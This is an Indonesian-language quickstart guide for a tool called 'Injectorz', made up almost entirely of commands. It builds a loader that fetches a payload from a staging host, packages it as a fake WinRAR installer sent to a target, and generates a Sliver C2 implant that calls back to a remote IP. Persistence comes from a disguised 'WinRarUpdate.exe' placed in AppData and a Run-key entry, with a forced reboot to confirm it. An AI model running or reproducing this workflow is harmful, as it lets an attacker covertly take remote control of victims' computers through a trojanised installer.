# QUICKSTART - Injectorz

Langkah cepat dari nol sampai persistence terpasang.

## 1. Build

```bash
cd ~/tools/injectorz
python3 build_loader.py --stager-ip 172.23.4.34 --stager-port 9999
python3 build_installer.py --installer winrar_x64.exe --output winrar_installer.exe
```

## 2. Generate Implant

Di Sliver console:
```
generate --http 172.23.4.34:8080 --os windows --arch amd64 --skip-symbols --format shellcode --save shellc.bin
```

Pilih encoder: `none`

## 3. Start Services

Terminal 1 - staging (detached):
```bash
cd ~/tools/injectorz
nohup python3 -m http.server 9999 >/tmp/stager.log 2>&1 &
```

Terminal 2 - Sliver:
```bash
sliver
http -L 172.23.4.34 -l 8080
```

## 4. Deploy

Kirim `winrar_installer.exe` ke target, user dobel-klik.

Tunggu session masuk (process: Notepad.exe).

## 5. Persistence

Dari session yang masuk:
```
sessions -i <ID>
mkdir "C:\Users\<user>\AppData\Local\WinRar"
upload /home/heyrm/tools/injectorz/loader.exe "C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe"
registry write --hive HKCU --type string "software\microsoft\windows\currentversion\run\WinRarUpdate" "C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe"
registry read --hive HKCU "software\microsoft\windows\currentversion\run\WinRarUpdate"
```

## 6. Verify

```
execute shutdown /r /t 0
```

Tunggu reboot + logon (2-3 menit), session baru harus masuk dari WinRarUpdate.exe.

---

## Cheat Sheet

```bash
# Cek staging log
tail -f /tmp/stager.log

# Cek staging process
pgrep -af 'http.server 9999'

# Kill staging
pkill -f 'http.server 9999'

# Hash loader (untuk verify upload)
sha256sum loader.exe
```

Di target Windows:
```powershell
# Cek Run key
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinRarUpdate

# Cek file persistence
dir "C:\Users\<user>\AppData\Local\WinRar"

# Hash file (compare dengan yang di Kali)
certutil -hashfile "C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe" SHA256

# Test manual
& "C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe"
```
